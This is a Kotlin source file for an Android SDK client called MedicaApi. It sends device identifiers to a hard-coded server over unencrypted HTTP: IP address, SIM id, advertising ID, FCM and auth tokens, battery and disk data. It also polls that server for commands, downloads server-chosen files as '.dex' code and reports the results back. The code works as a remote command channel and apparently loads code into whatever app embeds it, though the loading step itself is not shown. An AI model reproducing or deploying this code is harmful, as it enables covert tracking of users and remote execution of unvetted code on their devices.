package com.tunebrains.cpu.library

import android.util.Log
import com.google.gson.Gson
import com.tunebrains.cpu.dexlibrary.CommandResult
import com.tunebrains.cpu.library.cmd.LocalCommand
import com.tunebrains.cpu.library.cmd.ServerCommand
import io.reactivex.Completable
import io.reactivex.Single
import okhttp3.*
import okhttp3.HttpUrl.Companion.toHttpUrl
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.util.*

data class IPIinfo(val ip: String)
class ApiException(mes: String) : IOException(mes)
interface IMedicaApi {
    fun ip(): Single<IPIinfo>
    fun informServer(packageName: String, stats: DeviceStats, state: DeviceState): Completable
    fun command(local: LocalCommand): Single<LocalCommand>
    fun downloadFile(url: String, root: File): Single<File>
    fun downloadCommand(command: LocalCommand, cacheDir: File): Single<LocalCommand>
    fun reportCommand(it: LocalCommand, result: CommandResult): Completable
    fun log(ex: Throwable?, mes: String)
}

open class MedicaApi(val gson: Gson, val repository: TokenRepository) : IMedicaApi {
    override fun log(ex: Throwable?, mes: String) {
        val log = StringBuilder().apply {
            ex?.let {
                append(Log.getStackTraceString(it))
            }
            append(mes)
        }.toString()
        client.newCall(
            Request.Builder()
                .url(
                    "$BASE_URL/API_SDK/apk_log".toHttpUrl().newBuilder()
                        .addQueryParameter("log", log)
                        .build()
                )
                .build()
        ).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: Call, response: Response) {

            }

        })
    }

    companion object {
        const val BASE_URL = "http://api.magetic.com/c"
    }

    private val client = OkHttpClient.Builder().build()
    override fun ip(): Single<IPIinfo> {
        return Single.create<IPIinfo> { emitter ->
            client.newCall(Request.Builder().url("https://api6.ipify.org?format=json").build())
                .enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        if (!emitter.isDisposed) {
                            emitter.onError(e)
                        }
                    }

                    override fun onResponse(call: Call, response: Response) {
                        if (response.isSuccessful) {
                            val body = response.body?.string() ?: ""
                            val info = gson.fromJson(body, IPIinfo::class.java)
                            if (!emitter.isDisposed) {
                                emitter.onSuccess(info)
                            }
                        } else {
                            if (!emitter.isDisposed) {
                                emitter.onError(ApiException("Failed to get client ip"))
                            }
                        }
                    }

                })
        }.retry(3)
    }

    override fun informServer(packageName: String, stats: DeviceStats, state: DeviceState): Completable {
        return Completable.create { emitter ->
            client.newCall(
                Request.Builder().url(
                    "$BASE_URL/api".toHttpUrl().newBuilder()
                        .addQueryParameter("batt", state.battery.percent.toString())
                        .addQueryParameter("ele", state.battery.plugged.toString())
                        .addQueryParameter("id", repository.id())
                        .addQueryParameter("ip", state.ip)
                        .addQueryParameter("man", stats.manufacturer)
                        .addQueryParameter("mobileId", stats.simId)
                        .addQueryParameter("mobileName", stats.simName)
                        .addQueryParameter("idfa", stats.adId)
                        .addQueryParameter("conn", stats.connection)
                        .addQueryParameter("dskTotal", stats.diskTotal.toString())
                        .addQueryParameter("dskFree", stats.diskFree.toString())
                        .addQueryParameter("app", packageName)
                        .addQueryParameter("t", state.token.token)
                        .addQueryParameter("fcm", state.token.fcmToken)

                        .build()
                ).build()
            )
                .enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        if (!emitter.isDisposed) {
                            emitter.onError(e)
                        }
                    }

                    override fun onResponse(call: Call, response: Response) {
                        if (response.isSuccessful) {
                            if (!emitter.isDisposed) {
                                emitter.onComplete()
                            }

                        } else {
                            if (!emitter.isDisposed) {
                                emitter.onError(ApiException("Fail to inform server"))
                            }
                        }
                    }

                })
        }
    }

    override fun command(local: LocalCommand): Single<LocalCommand> {
        Logger.d("Will fetch command from server $local")
        return Single.create { emitter ->
            client.newCall(
                Request.Builder().url(
                    "$BASE_URL/api_command".toHttpUrl().newBuilder()
                        .addQueryParameter("com_id", local.serverId)
                        .addQueryParameter("token", repository.token())
                        .build()
                ).build()
            )
                .enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        if (!emitter.isDisposed) {
                            emitter.onError(e)
                        }
                    }

                    override fun onResponse(call: Call, response: Response) {
                        try {
                            if (response.isSuccessful) {
                                val body = response.body?.string() ?: ""
                                val info = gson.fromJson(body, ServerCommand::class.java)
                                if (info != null) {
                                    if (!emitter.isDisposed) {
                                        emitter.onSuccess(local.withServer(info))
                                    }
                                } else {
                                    if (!emitter.isDisposed) {
                                        emitter.onError(ApiException("Fail to get command $local"))
                                    }
                                }
                            } else {
                                if (!emitter.isDisposed) {
                                    emitter.onError(ApiException("Fail to get command $local"))
                                }
                            }
                        } catch (ex: Throwable) {
                            if (!emitter.isDisposed) {
                                emitter.onError(ApiException("Fail to get command $local"))
                            }
                        }
                    }

                })
        }
    }

    override fun downloadFile(url: String, root: File): Single<File> {
        Logger.d("Will download file from $url")

        return Single.create { emitter ->
            client.newCall(Request.Builder().url(url).build()).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    if (!emitter.isDisposed) {
                        emitter.onError(e)
                    }
                }

                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        try {
                            val tmp = File.createTempFile("cmd", ".dex", root)
                            val fos = FileOutputStream(tmp)
                            response.body?.let {
                                it.byteStream().copyTo(fos)
                            }
                            fos.close()
                            emitter.onSuccess(tmp)
                        } catch (ex: Throwable) {
                            if (!emitter.isDisposed) {
                                emitter.onError(ex)
                            }
                        }

                    } else {
                        if (!emitter.isDisposed) {
                            emitter.onError(ApiException("Fail to download file $url"))
                        }
                    }
                }

            })
        }
    }

    override fun downloadCommand(command: LocalCommand, cacheDir: File): Single<LocalCommand> {
        Logger.d("Will download command $command")

        return if (command.server != null) {
            downloadFile(command.server.dex, cacheDir).map {
                command.withDex(it.absolutePath)
            }
        } else {
            Single.error(ApiException("Failed to download empty server command"))
        }
    }

    override fun reportCommand(it: LocalCommand, result: CommandResult): Completable {
        Logger.d("Will report command $it")
        return Completable.create { emitter ->
            client.newCall(
                Request.Builder().url(
                    "$BASE_URL/api".toHttpUrl().newBuilder()
                        .addQueryParameter("report_id", UUID.randomUUID().toString())
                        .addQueryParameter("comm", result.status.name)
                        .addQueryParameter("comm_id", it.serverId)
                        .addQueryParameter("msg", result.message)
                        .addQueryParameter("token", repository.token())
                        .addQueryParameter("app", repository.app())
                        .addQueryParameter("ip", repository.ip())
                        .build()
                ).build()
            )
                .enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        if (!emitter.isDisposed) {
                            emitter.onError(e)
                        }
                    }

                    override fun onResponse(call: Call, response: Response) {
                        if (response.isSuccessful) {
                            if (!emitter.isDisposed) {
                                emitter.onComplete()
                            }

                        } else {
                            if (!emitter.isDisposed) {
                                emitter.onError(ApiException("Fail to inform server"))
                            }
                        }
                    }

                })
        }
    }
}